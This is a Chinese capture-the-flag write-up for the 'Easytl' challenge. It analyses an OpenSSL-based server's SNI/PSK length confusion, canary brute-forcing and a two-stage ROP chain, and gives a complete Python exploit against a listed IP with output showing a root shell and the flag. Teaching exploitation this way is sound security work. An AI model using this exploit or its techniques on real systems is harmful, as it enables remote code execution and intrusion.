@@ -1,0 +1,407 @@
+<!doctype html><meta charset="utf-8"><p>来源：https://coder.lufer.cc/2026/11/%E7%AC%AC%E5%8D%81%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFwp/</p><h2 class="wp-block-heading">Easytl</h2>
+<h3 class="wp-block-heading">题目</h3>
+<p class="wp-block-paragraph">“一个正常的服务器，快来试试吧。”</p>
+<h3 class="wp-block-heading">题解</h3>
+<p class="wp-block-paragraph">附件是一个 5.7 MB 的 ELF：<code>ELF 64-bit LSB executable, x86-64, statically linked, not stripped</code>（无 <code>.symtab</code>，但字符串里有 <code>3.0.13</code> 与 <code>../crypto/...</code>、<code>.note.stapsdt</code>，可判定为 OpenSSL 3.0.13 静态链接）。程序自己监听 1443 端口， 每来一个连接 <code>fork()</code> 三次后由“孙进程”处理，因此<strong>父进程常驻、所有子进程 canary 相同</strong>。</p>
+<h4 class="wp-block-heading">1、三个回调 + 一个全局变量“长度混搭”</h4>
+<p class="wp-block-paragraph">三个回调共用 0x970f40…0x970f68 的全局：</p>
+<pre class="wp-block-code"><code class="language-Python" lang="Python">char *g_p40; int g_len48;   <em>// 0x970f40 / 0x970f48   —— PSK identity 拷贝</em>
+char *g_p50; int g_len58;   <em>// 0x970f50 / 0x970f58   —— SNI 拷贝</em>
+char *g_p60; int g_len68;   <em>// 0x970f60 / 0x970f68   —— 日志用的 (ptr, len)</em></code></pre>
+<p class="wp-block-paragraph"><strong>① SNI 回调（0x40320a）</strong></p>
+<pre class="wp-block-code"><code class="language-Python" lang="Python">const char *name = SSL_get_servername(ssl, TLSEXT_NAMETYPE_host_name);
+if (!name || !*name) { g_len58 = 0; g_p50 = NULL; return SSL_TLSEXT_ERR_NOACK; }
+g_len58 = strlen(name);                 <em>// ← 长度进 g_len58</em>
+g_p50   = calloc(1, g_len58 + 0x10);
+memcpy(g_p50, name, g_len58);</code></pre>
+<p class="wp-block-paragraph">OpenSSL 侧限制：SNI 长度 <code>≤ 255</code>、且<strong>不能含 0 字节</strong>（<code>TLSEXT_MAXLEN_host_name</code>/<code>PACKET_contains_zero_byte</code>）， 所以 <code>g_len58 ≤ 255</code>。</p>
+<p class="wp-block-paragraph"><strong>② psk_find_session_cb（0x402dbb）</strong></p>
+<pre class="wp-block-code"><code class="language-Python" lang="Python">int cb(SSL *ssl, const u8 *identity, size_t identity_len, SSL_SESSION **out) {
+    if (strlen(identity) != 0x20 ||
+        memcmp(identity, "1401518dc5d7641ccd41593a5d812410", 0x20)) {
+        *out = NULL; return 1;                       <em>// 不认识 -&gt; 回落普通握手</em>
+    }
+    u8 *key = OPENSSL_hexstr2buf(
+        "c8ad2a35c51b87a466e22bc337696f0807ff73500ee154ee71bee86d0b6bc358", &amp;klen);
+    g_len48 = 0x20;
+    g_p40   = calloc(1, identity_len + 0x10);         <em>// ← identity_len 完全可控</em>
+    memcpy(g_p40, identity, identity_len);            <em>// ← 内容完全可控</em>
+    HMAC(EVP_sha256(), key, 32, g_p40, 0x20, mk, &amp;mlen);
+    sess = SSL_SESSION_new();
+    SSL_SESSION_set1_master_key(sess, mk, mlen);
+    SSL_SESSION_set_cipher(sess, SSL_CIPHER_find(ssl, "\x13\x02"));
+    SSL_SESSION_set_protocol_version(sess, SSL_version(ssl));
+    *out = sess; return 1;
+}</code></pre>
+<p class="wp-block-paragraph">注意 <code>strlen(identity) == 0x20</code> 只需要<strong>前 33 字节</strong>满足 <code>magic + '\0'</code>，<code>identity_len</code> 可以远大于 32 —— 于是 <code>g_p40</code> 是一块<strong>大小、内容全由攻击者决定</strong>的堆缓冲区。</p>
+<p class="wp-block-paragraph"><strong>③ info 回调（0x4030d5）</strong></p>
+<pre class="wp-block-code"><code class="language-Python" lang="Python">void info_cb(const SSL *ssl, int where, int ret) {
+    if (where &amp; 0x2002) {          <em>// SSL_CB_ACCEPT_LOOP(0x2001) / ACCEPT_EXIT(0x2002)</em>
+        g_p60 = g_p40 ? g_p40 : (g_p50 ? g_p50 : NULL);
+        if (g_len48) g_len68 = g_len48;      <em>// = 0x20</em>
+        if (g_len58) g_len68 = g_len58;      <em>// ← 被 SNI 长度覆盖！</em>
+    } else if (where &amp; 0x4004) {   <em>// SSL_CB_ALERT（0x4000） | READ(0x4)</em>
+        int fd = SSL_get_fd(ssl);
+        if (g_p40) {                          <em>// ① PSK 身份路径</em>
+            g_p60 = g_p40;
+            if (g_len48 == 0x20) log_error();  <em>// 只校验 len48，拷贝用的却是 len68</em>
+        } else if (g_p50) {                    <em>// ② 纯 SNI 路径</em>
+            g_p60 = g_p50;
+            if (g_len58 &lt;= 0x40) log_error();  <em>// 这条路径是安全的</em>
+        }
+        send(fd, "error", 5);                  <em>// ← 明文 5 字节，canary 旁路信道</em>
+    }
+}
+
+void log_error(void) {                         <em>// 0x40304d</em>
+    char buf[0x50];                            <em>// rbp-0x60，canary 在 rbp-8</em>
+    memset(buf, 0, 0x50);
+    memcpy(buf, g_p60, g_len68);               <em>// ← 长度检查对象 ≠ 拷贝对象</em>
+    fprintf(stderr, "%s error\n", buf);
+}</code></pre>
+<p class="wp-block-paragraph"><strong>漏洞一句话</strong>：alert 分支走 <code>g_p40</code> 时只检查 <code>g_len48 == 0x20</code>，但 <code>memcpy</code> 的长度是 已被 SNI 分支改写的 <code>g_len68 = strlen(SNI)</code>（≤255），源指针是 PSK identity 副本 <code>g_p40</code>。于是得到一个<strong>长度可控（由 SNI 决定）、内容可控（由 PSK identity 决定）的栈溢出</strong>：</p>
+<pre class="wp-block-code"><code class="language-Python" lang="Python">栈布局（log_error）：  buf[0x50] | pad | canary(rbp-8) | saved rbp(rbp) | ret(rbp+8) | ...
+                      偏移 0x00                      0x58             0x60          0x68</code></pre>
+<p class="wp-block-paragraph">溢出上限 255 字节，足够覆盖 canary + saved rbp + ret + 约 8 个 gadget 地址。</p>
+<h4 class="wp-block-heading">2、 触发条件：先制造一次 HelloRetryRequest</h4>
+<p class="wp-block-paragraph">坑点：<code>0x2002</code> 分支只在状态机每次迭代时触发，而 SNI/PSK 回调是在<strong>本次迭代解析 CH 时</strong> 才执行的；如果 PSK 直接放在第一个 ClientHello 里，binder 校验失败 → 立刻发 alert， 此时 <code>g_len68</code> 仍是 0，不会溢出。必须在 alert 之前让 <code>g_len68 = strlen(SNI)</code> 先落地。 最干净的办法是 <strong>HelloRetryRequest</strong>：</p>
+<ol class="wp-block-list">
+<li><strong>ClientHello#1</strong>：<code>supported_versions=TLS1.3</code>，<code>supported_groups=[0x1234, 0x001d]</code>， <code>key_share</code> 只给服务器不支持的组 <code>0x1234</code>（结构合法，32 字节任意值），SNI = <code>"A"*S</code> （<code>S ≤ 255</code> → 发给服务器的 SNI 是 255 个 <code>'A'</code>）。 → 服务器回 <strong>HRR</strong>（ServerHello.random 为固定值 <code>cf21ad74…a8339c</code>）。 这一轮里 SNI 回调置 <code>g_len58=S</code>，随后的 <strong>ACCEPT_EXIT</strong> 事件把 <code>g_len68=S</code> 固化下来。</li>
+<li><strong>ClientHello#2</strong>：同样 SNI，<code>key_share</code> 改为 x25519（32 字节），并在最后追加 <code>pre_shared_key</code> 扩展： <code>identity = "1401518dc5d7641ccd41593a5d812410" + "\x00" + &lt;payload&gt;</code>。 → 解析到 PSK 扩展时 <code>psk_find_session_cb</code> 把 identity 拷进 <code>g_p40</code>； 随后 libssl 校验手搓 session：app 用 <code>SSL_version(ssl)</code> 设置 session 版本， 与 <code>tls_psk_do_binder</code> 要求的 TLS1.3 不一致 → <code>SSLfatal(SSL_AD_ILLEGAL_PARAMETER)</code> → 发出 alert <code>15 03 03 00 02 02 2f</code> → <code>info_cb</code> 进入 alert 分支 → <code>memcpy(buf, g_p40, S)</code> → <strong>溢出</strong>。</li>
+</ol>
+<h4 class="wp-block-heading">4、爆破 Stack Canary（fork 型服务 + 长度可控的 memcpy）</h4>
+<ul class="wp-block-list">
+<li>溢出长度 = <code>strlen(SNI) = S</code>。把 <code>S</code> 设为 <code>0x58 + k</code>，就<strong>只覆盖 canary 的前 k 字节</strong>， 其余 <code>8-k</code> 字节保持内核给出的原值。猜对 → canary 校验通过 → <code>log_error</code> 正常返回 → <code>info_cb</code> 继续执行 <code>send(fd, "error", 5)</code>，我们在 TLS 连接上收到<strong>明文 <code>error</code></strong>； 猜错 → <code>__stack_chk_fail</code> → 子进程直接消失，只会收到 alert、收不到 <code>error</code>。</li>
+<li>服务是<strong>自己 bind 端口并 fork</strong> 的常驻进程，父进程的 canary 被子进程继承， <strong>所有连接 canary 相同</strong>，因此可以逐字节爆破（glibc 最低字节固定 <code>0x00</code>，7×256 次最坏； 多线程并发约 2 分钟）。</li>
+<li>实测爆破过程：</li>
+</ul>
+<pre class="wp-block-code"><code class="language-Python" lang="Python">canary[1] = 0xcb   (00cb)
+canary[2] = 0x05   (00cb05)
+canary[3] = 0x0b   (00cb050b)
+canary[4] = 0x73   (00cb050b73)
+canary[5] = 0xdc   (00cb050b73dc)
+canary[6] = 0xcd   (00cb050b73dccd)
+canary[7] = 0x3a   (00cb050b73dccd3a)
+canary = 00cb050b73dccd3a</code></pre>
+<p class="wp-block-paragraph">用完整 canary（<code>S=0x60</code>）复验：服务器返回 <code>15 03 03 00 02 02 2f</code> + <code>error</code>，说明 canary 正确。</p>
+<h4 class="wp-block-heading">4、两阶段 ROP（溢出只有 255 字节）</h4>
+<p class="wp-block-paragraph">静态非 PIE ⇒ 所有 gadget 地址固定。选用的 gadget：</p>
+<figure class="wp-block-table"><table class="has-fixed-layout"><thead><tr><th class="has-text-align-left" data-align="left">gadget</th><th class="has-text-align-left" data-align="left">地址</th></tr></thead><tbody><tr><td><code>pop rdi ; ret</code></td><td><code>0x4251bd</code></td></tr><tr><td><code>pop rsi ; ret</code></td><td><code>0x5e9a79</code></td></tr><tr><td><code>pop rdx ; ret</code></td><td><code>0x52f0d2</code></td></tr><tr><td><code>pop rax ; ret</code></td><td><code>0x5f6c9a</code></td></tr><tr><td><code>pop rsp ; ret</code></td><td><code>0x4b9b60</code></td></tr><tr><td><code>syscall ; ret</code></td><td><code>0x76e706</code></td></tr></tbody></table></figure>
+<ul class="wp-block-list">
+<li><strong>Stage 1</strong>（放在溢出里，长度刚好 <code>0x58 + 0x68 = 0xC0</code>）： <code>read(4, 0x972000 /* .bss */, 0x800)</code>，随后 <code>pop rsp; ret -&gt; 0x972000</code> 完成栈迁移。</li>
+<li><strong>Stage 2</strong>（触发后延迟 0.15 s 再发；此时 ROP 的 <code>read</code> 已阻塞，避免被 OpenSSL 记录层读进自己的缓冲）：<code>dup2(4,0/1/2)</code> → <code>execve("/bin/sh", argv, NULL)</code>。 二进制里没有 <code>/bin/sh</code> 字符串（<code>system/popen</code> 未被链接进来），所以把 <code>/bin/sh\0</code> 和 <code>argv</code> 数组一起写进 <code>.bss</code>。</li>
+</ul>
+<p class="wp-block-paragraph">细节：</p>
+<ul class="wp-block-list">
+<li>客户端 socket fd = 4：<code>socket()</code> 拿 3、<code>accept()</code> 拿 4，子进程在 <code>SSL_accept</code> 前 <code>close(listenfd)</code>；先用单阶段 <code>write(4, "TLS_AES...", 4)</code> 实测在 TLS 连接上收到明文 <code>TLS_</code>，确认 ROP 可控且 fd 正确。</li>
+<li><code>read(4, …)</code> 一次只能拿到“当前已到达”的字节，所以 stage2 必须<strong>在收到 alert 之后再发</strong>， 且整个 blob（304 字节）一次 <code>sendall</code> 发出，保证一次 read 全量读入。</li>
+</ul>
+<h4 class="wp-block-heading">5、完整攻击链一览</h4>
+<pre class="wp-block-code"><code class="language-Python" lang="Python">ClientHello#1  (key_share=0x1234, SNI="A"*S, 无 PSK)
+        │  → HelloRetryRequest ；SNI 回调置 g_len58=S，ACCEPT_EXIT 置 g_len68=S
+        ▼
+ClientHello#2  (key_share=x25519, pre_shared_key identity = magic||'\0'||payload)
+        │  → psk_find_session_cb：g_p40 = calloc(identity_len+0x10); memcpy(g_p40, identity, len)
+        │  → session 版本不符 → alert(illegal_parameter)
+        ▼
+info_cb(alert) → memcpy(stack_buf[0x50], g_p40, S)   ← 溢出
+        ├─ canary 不对：__stack_chk_fail，连接静默断开
+        └─ canary 正确：ROP → read(4,.bss) → dup2 → execve("/bin/sh") → 交互 shell</code></pre>
+<h4 class="wp-block-heading">6、具体解题脚本</h4>
+<p class="wp-block-paragraph">单文件、从题目数据直接打到 flag：先逐字节爆破 canary，再触发两阶段 ROP， 最后在得到的 shell 里执行命令读取 flag。</p>
+<pre class="wp-block-code"><code class="language-Python" lang="Python"><em>#!/usr/bin/env python3</em>
+"""
+easytl (强网杯) - remote exploit
+================================
+Bug:  the app registers SSL_CTX_set_psk_find_session_callback().  Its callback
+      copies the TLS 1.3 external-PSK identity into a heap buffer and stores the
+      length in a global while the *SNI* callback stores strlen(servername) in
+      another global.  The info-callback's alert path then does
+
+          memcpy(stack_buf[0x50], session_ptr, sni_len)
+
+      so a long SNI + a matching PSK identity gives a fully controlled stack
+      overflow.  The buffer sits under a stack canary, but the memcpy length is
+      attacker controlled, so the canary can be brute forced one byte at a time:
+      when the guess is right the server still sends the 5-byte plaintext
+      "error" (send() after the memcpy), otherwise the child dies silently.
+
+      The service is a fork()ing server that binds the port itself, so every
+      connection is a child of the same process -&gt; the canary never changes.
+
+Exploit path
+------------
+ 1. ClientHello#1: bogus key_share (group 0x1234) + long SNI -&gt; HelloRetryRequest
+    (an ACCEPT_LOOP/EXIT event now caches sni_len in the copy length global).
+ 2. ClientHello#2: x25519 key_share + pre_shared_key extension whose identity is
+        "1401518dc5d7641ccd41593a5d812410" + "\x00" + &lt;payload&gt;
+    -&gt; psk_find_session_cb copies the identity to the heap, then the hand-built
+    session is rejected (protocol version) with a fatal alert.
+ 3. The alert drives info_cb -&gt; memcpy(stack, heap_identity, strlen(SNI))
+    -&gt; overflow with our payload (canary at +0x58, saved rbp +0x60, ret +0x68).
+ 4. ROP: read(4, .bss, 0x800); pop rsp -&gt; .bss  (two-stage, because the ROP
+    chain is limited to 255 bytes).  Stage 2: dup2(4,0/1/2); execve("/bin/sh").
+"""
+import socket, struct, os, sys, time, threading, queue, hashlib
+
+HOST = os.environ.get("EASYTL_HOST", "47.105.112.170")
+PORT = int(os.environ.get("EASYTL_PORT", "1443"))
+
+MAGIC = b"1401518dc5d7641ccd41593a5d812410"
+HRR_RANDOM = bytes.fromhex("cf21ad74e59a6111be1d8c021e65b891c2a211167abb8c5e079e09e2c8a8339c")
+
+<em># fixed (non-PIE) code addresses</em>
+POP_RDI = 0x4251bd
+POP_RSI = 0x5e9a79
+POP_RDX = 0x52f0d2
+POP_RAX = 0x5f6c9a
+POP_RSP = 0x4b9b60
+SYSCALL = 0x76e706
+BSS = 0x972000
+
+
+def q(x):
+    return struct.pack("&lt;Q", x)
+
+
+<em># ---------------------------------------------------------------- TLS helpers</em>
+def ext(t, d):
+    return struct.pack("&gt;HH", t, len(d)) + d
+
+
+def build_ch(sni, groups, key_shares, psk_identity=None, cipher=0x1302):
+    exts = b""
+    if sni is not None:
+        ent = struct.pack("&gt;BH", 0, len(sni)) + sni
+        exts += ext(0, struct.pack("&gt;H", len(ent)) + ent)
+    g = b"".join(struct.pack("&gt;H", x) for x in groups)
+    exts += ext(10, struct.pack("&gt;H", len(g)) + g)
+    exts += ext(13, struct.pack("&gt;H", 4) + struct.pack("&gt;HH", 0x0804, 0x0403))
+    exts += ext(43, b"\x02\x03\x04")          <em># supported_versions: TLS1.3</em>
+    exts += ext(45, b"\x01\x01")              <em># psk_dhe_ke</em>
+    if key_shares:
+        ks = b"".join(struct.pack("&gt;HH", gid, len(k)) + k for gid, k in key_shares)
+        exts += ext(51, struct.pack("&gt;H", len(ks)) + ks)
+    if psk_identity is not None:              <em># pre_shared_key, must be last</em>
+        ident = struct.pack("&gt;H", len(psk_identity)) + psk_identity + struct.pack("&gt;I", 0)
+        ids = struct.pack("&gt;H", len(ident)) + ident
+        binders = struct.pack("&gt;H", 49) + bytes([48]) + os.urandom(48)
+        exts += ext(41, ids + binders)
+
+    body = struct.pack("&gt;H", 0x0303) + os.urandom(32) + b"\x00"
+    body += struct.pack("&gt;H", 2) + struct.pack("&gt;H", cipher)
+    body += b"\x01\x00" + struct.pack("&gt;H", len(exts)) + exts
+    return b"\x01" + struct.pack("&gt;I", len(body))[1:] + body
+
+
+def rec_until(s, n, timeout):
+    s.settimeout(timeout)
+    out = b""
+    while len(out) &lt; n:
+        try:
+            d = s.recv(8192)
+        except socket.timeout:
+            break
+        except OSError:
+            break
+        if not d:
+            break
+        out += d
+    return out
+
+
+def trigger(canary, payload_body, sni_len, wait_alert=False, delay=0.0, stage2=None):
+    """Raises the overflow. payload_body is written at stack offset 0x58."""
+    ident = bytearray(b"F" * max(sni_len, 0x58 + len(payload_body)))
+    ident[0:32] = MAGIC
+    ident[32] = 0x00
+    ident[0x58:0x58 + len(payload_body)] = payload_body
+    sni = b"A" * sni_len
+
+    s = socket.create_connection((HOST, PORT), timeout=6)
+    c1 = build_ch(sni, [0x1234, 0x1d], [(0x1234, os.urandom(32))])
+    s.sendall(b"\x16\x03\x01" + struct.pack("&gt;H", len(c1)) + c1)
+    r1 = rec_until(s, 5, 3.0)
+    hl = struct.unpack("&gt;H", r1[3:5])[0] if len(r1) &gt;= 5 else 0
+    r1 += rec_until(s, max(0, 5 + hl - len(r1)), 3.0)
+    if not (len(r1) &gt;= 5 + hl and r1[0] == 0x16 and r1[11:43] == HRR_RANDOM):
+        s.close()
+        return None, r1
+    c2 = build_ch(sni, [0x1234, 0x1d], [(0x1d, os.urandom(32))], psk_identity=bytes(ident))
+    s.sendall(b"\x16\x03\x03" + struct.pack("&gt;H", len(c2)) + c2)
+    out = b""
+    if wait_alert:
+        out = rec_until(s, 7, 2.0)
+    if stage2 is not None:
+        if delay:
+            time.sleep(delay)
+        s.sendall(stage2)
+    return s, out
+
+
+<em># ------------------------------------------------------------ canary recovery</em>
+def canary_oracle(prefix):
+    """prefix = canary bytes recovered so far (&gt;=1). True if the guess was right."""
+    sni_len = 0x58 + len(prefix)
+    body = bytes(prefix)
+    s, _ = trigger(bytes(prefix), body, sni_len)
+    if s is None:
+        return None
+    s.settimeout(0.8)
+    data = b""
+    t = time.time()
+    while time.time() - t &lt; 0.9:
+        try:
+            d = s.recv(4096)
+        except socket.timeout:
+            break
+        except OSError:
+            break
+        if not d:
+            break
+        data += d
+        if b"error" in data:
+            break
+    s.close()
+    return b"error" in data
+
+
+def recover_canary(threads=8):
+    canary = bytearray(b"\x00")              <em># glibc terminator canary</em>
+    while len(canary) &lt; 8:
+        j = len(canary)
+        found, stop = [None], threading.Event()
+        qn = queue.Queue()
+        for g in range(256):
+            qn.put(g)
+        lock = threading.Lock()
+
+        def worker():
+            while not stop.is_set():
+                try:
+                    g = qn.get_nowait()
+                except queue.Empty:
+                    return
+                guess = bytes(canary) + bytes([g])
+                ok = None
+                for _ in range(3):
+                    ok = canary_oracle(guess)
+                    if ok is not None:
+                        break
+                    time.sleep(0.05)
+                if ok:
+                    with lock:
+                        if not stop.is_set():
+                            found[0] = g
+                            stop.set()
+                    return
+
+        ts = [threading.Thread(target=worker, daemon=True) for _ in range(threads)]
+        for t in ts:
+            t.start()
+        for t in ts:
+            t.join()
+        if found[0] is None:
+            raise RuntimeError("canary byte %d not found" % j)
+        canary.append(found[0])
+        print("  canary[%d] = 0x%02x   (%s)" % (j, found[0], canary.hex()), flush=True)
+    return bytes(canary)
+
+
+<em># ------------------------------------------------------------------ ROP stages</em>
+def stage1(canary, fd):
+    chain = (q(POP_RDI) + q(fd) + q(POP_RSI) + q(BSS) + q(POP_RDX) + q(0x800) +
+             q(POP_RAX) + q(0) + q(SYSCALL) + q(POP_RSP) + q(BSS))
+    return canary + q(0xdeadbeefdeadbeef) + chain
+
+
+def stage2_shell(fd, sh_off=0x100, argv_off=0x120):
+    chain = b""
+    for newfd in (0, 1, 2):
+        chain += q(POP_RDI) + q(fd) + q(POP_RSI) + q(newfd) + q(POP_RAX) + q(33) + q(SYSCALL)
+    chain += (q(POP_RDI) + q(BSS + sh_off) + q(POP_RSI) + q(BSS + argv_off) +
+              q(POP_RDX) + q(0) + q(POP_RAX) + q(59) + q(SYSCALL) + q(0))
+    data = bytearray(chain)
+    data += b"\x00" * (sh_off - len(data))
+    data[sh_off:sh_off + 8] = b"/bin/sh\x00"
+    data += b"\x00" * (argv_off - len(data))
+    data += q(BSS + sh_off) + q(0)
+    return bytes(data)
+
+
+def pwn(canary, fd=4, delay=0.15):
+    body = stage1(canary, fd)
+    sni_len = 0x58 + len(body)
+    assert sni_len &lt;= 255
+    s, alert = trigger(canary, body, sni_len, wait_alert=True, delay=delay,
+                       stage2=stage2_shell(fd))
+    if s is None:
+        print("[-] handshake retry failed")
+        return None
+    time.sleep(0.4)
+    return s
+
+
+def main():
+    print("[*] target %s:%d" % (HOST, PORT))
+    cf = "qw_canary.bin"
+    if os.path.exists(cf):
+        canary = open(cf, "rb").read()
+        print("[*] cached canary %s" % canary.hex())
+    else:
+        print("[*] brute forcing stack canary (byte by byte via the 'error' oracle)")
+        canary = recover_canary()
+        print("[+] canary = %s" % canary.hex())
+    print("[*] triggering overflow + ROP ...")
+    s = pwn(canary)
+    if not s:
+        print("[-] failed")
+        return
+    s.settimeout(3.0)
+    cmd = b"id; pwd; ls -la; cat flag 2&gt;/dev/null; cat /flag 2&gt;/dev/null; echo __DONE__\n"
+    s.sendall(cmd)
+    out = b""
+    t0 = time.time()
+    while time.time() - t0 &lt; 8:
+        try:
+            d = s.recv(4096)
+        except socket.timeout:
+            break
+        except OSError:
+            break
+        if not d:
+            break
+        out += d
+        if b"__DONE__" in out:
+            break
+    print("[+] shell output:\n")
+    sys.stdout.write(out.decode("latin1"))
+    print()
+    s.close()
+
+
+if __name__ == "__main__":
+    main()
+</code></pre>
+<pre class="wp-block-code"><code class="language-Python" lang="Python">[*] target 47.105.112.170:1443
+[*] brute forcing stack canary (byte by byte via the 'error' oracle)
+  canary[1] = 0xcb   (00cb)
+  canary[2] = 0x05   (00cb05)
+  canary[3] = 0x0b   (00cb050b)
+  canary[4] = 0x73   (00cb050b73)
+  canary[5] = 0xdc   (00cb050b73dc)
+  canary[6] = 0xcd   (00cb050b73dccd)
+  canary[7] = 0x3a   (00cb050b73dccd3a)
+[+] canary = 00cb050b73dccd3a
+[*] triggering overflow + ROP ...
+[+] shell output:
+
+uid=0(root) gid=0(root) groups=0(root)
+/home/ctf
+total 5644
+-rwxr-x--- 1 root ctf  5708848 Oct 24 02:33 easytl
+-r--r--r-- 1 root ctf       38 Oct 24 03:00 flag
+-r--r--r-- 1 root ctf     1151 Oct 24 02:50 server.crt
+-r--r--r-- 1 root ctf     1704 Oct 24 02:48 server.key
+flag{e17a75032670d5df9a28077b982b0d5d}__DONE__
+</code></pre>
